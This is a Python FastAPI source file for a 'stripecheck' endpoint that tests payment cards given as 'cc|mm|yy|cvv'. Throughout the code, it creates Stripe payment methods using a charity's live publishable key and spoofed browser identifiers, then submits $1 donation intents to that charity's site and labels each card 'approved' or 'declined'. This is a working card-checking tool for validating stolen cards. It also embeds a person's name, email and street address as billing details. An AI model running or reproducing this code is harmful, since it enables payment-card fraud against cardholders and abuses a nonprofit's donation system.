from fastapi import FastAPI, Query
from pydantic import BaseModel
import requests
import json

app = FastAPI()

class CardData(BaseModel):
    cc_number: str
    exp_month: str
    exp_year: str
    cvc: str

@app.get("/stripecheck/")
def stripe_check(
    cc: str = Query(..., example="4111111111111111|12|26|123")
):
    try:
        cc_number, exp_month, exp_year, cvc = cc.strip().split("|")
        # (You can add more validation if desired)
    except Exception as e:
        return {"status": "error", "message": "Invalid card format (should be cc|mm|yy|cvv)"}

    # ===== YOUR STRIPE LOGIC =====
    name = "Bunny Mm"
    email = "btbunny541@gmail.com"
    address1 = "3022 W Sherman Dr"
    address2 = ""
    country = "US"
    state = "NM"

    # 1. Create Stripe payment_method
    stripe_url = "https://api.stripe.com/v1/payment_methods"
    stripe_data = {
        "type": "card",
        "billing_details[address][line1]": address1,
        "billing_details[address][line2]": address2,
        "billing_details[address][country]": country,
        "billing_details[address][state]": state,
        "billing_details[name]": name,
        "billing_details[email]": email,
        "card[number]": cc_number,
        "card[cvc]": cvc,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "guid": "3ed75406-2ff1-435e-9e07-b92b61a6adee61a0d3",
        "muid": "7d6856df-8385-4dd2-b009-f6aff9f297cd5034ab",
        "sid": "2d019e7d-7fca-453c-810b-c3fa008abaff8e4797",
        "payment_user_agent": "stripe.js/fc71f304ed; stripe-js-v3/fc71f304ed; split-card-element",
        "referrer": "https://highatlasfoundation.org",
        "time_on_page": "204467",
        "key": "pk_live_51NyCj2DRPQe2ZTugsSUjgpmfiq9Ui8WQ7oqHOw8lFVXIRZethDCJwjPcowQcvzGN3yXqfEGx6xDLwsMcoeNMkAdN005PTj8L7O",
        "_stripe_version": "2025-03-31.basil",
        # "radar_options[hcaptcha_token]": "FRESH_HCAPTCHA_TOKEN"  # Not included unless you have a valid token!
    }
    stripe_headers = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0"
    }
    stripe_response = requests.post(stripe_url, headers=stripe_headers, data=stripe_data)
    if stripe_response.status_code != 200:
        return {"status": "declined", "message": stripe_response.text}
    stripe_json = stripe_response.json()
    payment_method_id = stripe_json.get("id")
    if not payment_method_id:
        return {"status": "declined", "message": stripe_json}

    # 2. Create Payment Intent on the target website
    intent_url = "https://highatlasfoundation.org/api/stripe/create-intent"
    intent_headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://highatlasfoundation.org",
        "referer": "https://highatlasfoundation.org/en/donate",
        "user-agent": "Mozilla/5.0"
    }
    intent_data = {
        "amount": 1,
        "billingDetails": {
            "address": {
                "line1": address1,
                "line2": address2,
                "country": country,
                "state": state
            },
            "name": name,
            "email": email
        },
        "metadata": {
            "amount": 1,
            "country": country,
            "email": email,
            "firstName": name.split()[0],
            "lastName": name.split()[1] if len(name.split()) > 1 else "",
            "state": state,
            "streetAddress": address1
        },
        "paymentMethod": {
            "id": payment_method_id,
            "object": "payment_method",
            "allow_redisplay": "unspecified",
            "billing_details": {
                "address": {
                    "city": None,
                    "country": country,
                    "line1": address1,
                    "line2": address2,
                    "postal_code": None,
                    "state": state
                },
                "email": email,
                "name": name,
                "phone": None,
                "tax_id": None
            },
            "card": {
                "brand": "visa",
                "checks": {
                    "address_line1_check": None,
                    "address_postal_code_check": None,
                    "cvc_check": None
                },
                "country": country,
                "display_brand": "visa",
                "exp_month": int(exp_month),
                "exp_year": 2000 + int(exp_year) if len(exp_year)==2 else int(exp_year),
                "funding": "credit",
                "generated_from": None,
                "last4": cc_number[-4:],
                "networks": {
                    "available": ["visa"],
                    "preferred": None
                },
                "regulated_status": "unregulated",
                "three_d_secure_usage": {
                    "supported": True
                },
                "wallet": None
            },
            "created": 1751565392,
            "customer": None,
            "livemode": True,
            "radar_options": {},
            "type": "card"
        }
    }
    intent_response = requests.post(intent_url, headers=intent_headers, data=json.dumps(intent_data))
    try:
        result = intent_response.json()
    except Exception:
        return {"status": "error", "message": intent_response.text}

    # Simple outcome logic
    text = json.dumps(result)
    if "succeeded" in text or "approved" in text.lower():
        return {"status": "approved", "message": "Card Approved", "response": result}
    elif "decline" in text.lower() or "failed" in text.lower():
        return {"status": "declined", "message": "Card Declined", "response": result}
    else:
        return {"status": "unknown", "message": "Unhandled response", "response": result}

